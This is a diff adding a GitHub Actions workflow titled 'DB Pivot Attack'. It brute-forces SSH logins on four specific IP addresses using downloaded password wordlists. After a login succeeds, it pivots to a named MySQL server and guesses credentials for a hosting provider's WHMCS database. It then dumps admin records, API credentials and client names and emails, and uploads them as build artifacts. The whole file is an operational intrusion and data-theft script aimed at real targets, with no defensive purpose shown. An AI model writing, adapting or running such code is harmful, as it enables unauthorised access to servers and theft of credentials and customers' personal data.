@@ -1,0 +1,95 @@
+name: DB Pivot Attack
+"on":
+  workflow_dispatch:
+
+jobs:
+  ssh-then-db:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        host: ["5.161.125.229", "49.12.41.9", "5.78.127.58", "5.78.153.212"]
+        user: [root, admin]
+    steps:
+      - uses: actions/checkout@v4
+      - name: SSH Brute then DB Pivot
+        run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq sshpass mysql-client hydra 2>&1 | tail -1
+          echo "Runner: $(curl -s ifconfig.me)"
+          
+          # Download wordlists
+          wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" -O /tmp/10k.txt 2>/dev/null
+          wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top1000.txt" -O /tmp/darkweb.txt 2>/dev/null
+          
+          SSH_FOUND=""
+          
+          # Try passwords
+          while IFS= read -r pass; do
+            [ -z "$pass" ] && continue
+            result=$(timeout 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "${{ matrix.user }}@${{ matrix.host }}" "echo SSH_OK; hostname; id" 2>&1)
+            if echo "$result" | grep -q "SSH_OK"; then
+              echo "*** SSH ACCESS: ${{ matrix.user }}@${{ matrix.host }} : $pass ***"
+              echo "$pass" > /tmp/ssh_pass.txt
+              SSH_FOUND="yes"
+              
+              # Pivot to DB
+              echo "=== Checking DB reachability from ${{ matrix.host }} ==="
+              DB_PORT=$(timeout 8 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 "${{ matrix.user }}@${{ matrix.host }}" "timeout 5 bash -c 'echo >/dev/tcp/207.148.18.120/3306' 2>/dev/null && echo OPEN || echo CLOSED" 2>&1)
+              echo "DB Port: $DB_PORT"
+              
+              if echo "$DB_PORT" | grep -q "OPEN"; then
+                echo "*** DB REACHABLE - trying credentials ***"
+                for dbuser in hyonix_api root hyonix admin whmcs; do
+                  for dbpass in HyonixAPI@123 hyonix hyonix123 password admin P@ssw0rd root; do
+                    OUT=$(timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 "${{ matrix.user }}@${{ matrix.host }}" "mysql -h 207.148.18.120 -u $dbuser -p'$dbpass' --connect-timeout=5 hyonix_whmcs -e 'SELECT 1;' 2>&1" 2>&1)
+                    if echo "$OUT" | grep -q "1"; then
+                      echo "*** MYSQL ACCESS: $dbuser:$dbpass ***"
+                      echo "$dbuser:$dbpass" > /tmp/db_cred.txt
+                      sshpass -p "$pass" ssh "${{ matrix.user }}@${{ matrix.host }}" "mysql -h 207.148.18.120 -u $dbuser -p'$dbpass' hyonix_whmcs -e 'SHOW TABLES;'" > /tmp/db_tables.txt 2>&1
+                      sshpass -p "$pass" ssh "${{ matrix.user }}@${{ matrix.host }}" "mysql -h 207.148.18.120 -u $dbuser -p'$dbpass' hyonix_whmcs -e 'SELECT * FROM tbladmins;'" > /tmp/db_admins.txt 2>&1
+                      sshpass -p "$pass" ssh "${{ matrix.user }}@${{ matrix.host }}" "mysql -h 207.148.18.120 -u $dbuser -p'$dbpass' hyonix_whmcs -e 'SELECT * FROM api_credentials;'" > /tmp/db_api.txt 2>&1
+                      sshpass -p "$pass" ssh "${{ matrix.user }}@${{ matrix.host }}" "mysql -h 207.148.18.120 -u $dbuser -p'$dbpass' hyonix_whmcs -e 'SELECT id,firstname,lastname,email FROM tblclients LIMIT 50;'" > /tmp/db_clients.txt 2>&1
+                      cat /tmp/db_tables.txt > /tmp/db_dump.txt
+                      cat /tmp/db_admins.txt >> /tmp/db_dump.txt
+                      cat /tmp/db_api.txt >> /tmp/db_dump.txt
+                      tail -100 /tmp/db_clients.txt >> /tmp/db_dump.txt
+                      exit 0
+                    fi
+                  done
+                done
+              fi
+              
+              # Try local MySQL
+              for dbuser in root hyonix admin; do
+                for dbpass in HyonixAPI@123 hyonix password admin root; do
+                  LOCAL=$(timeout 8 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 "${{ matrix.user }}@${{ matrix.host }}" "mysql -u $dbuser -p'$dbpass' -e 'SELECT 1;' 2>&1" 2>&1)
+                  if echo "$LOCAL" | grep -q "1"; then
+                    echo "*** LOCAL MYSQL: $dbuser:$dbpass on ${{ matrix.host }} ***"
+                    echo "$dbuser:$dbpass" > /tmp/local_db.txt
+                  fi
+                done
+              done
+              
+              exit 0
+            fi
+          done < /tmp/10k.txt
+          
+          while IFS= read -r pass; do
+            [ -z "$pass" ] && continue
+            [ -n "$SSH_FOUND" ] && break
+            result=$(timeout 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "${{ matrix.user }}@${{ matrix.host }}" "echo SSH_OK" 2>&1)
+            if echo "$result" | grep -q "SSH_OK"; then
+              echo "*** SSH ACCESS (darkweb list): ${{ matrix.user }}@${{ matrix.host }} : $pass ***"
+              echo "$pass" > /tmp/ssh_pass.txt
+              SSH_FOUND="yes"
+              exit 0
+            fi
+          done < /tmp/darkweb.txt
+          
+          [ -z "$SSH_FOUND" ] && echo "No SSH access for ${{ matrix.user }}@${{ matrix.host }}"
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: pivot-${{ matrix.host }}-${{ matrix.user }}
+          path: /tmp/*.txt
+          if-no-files-found: ignore
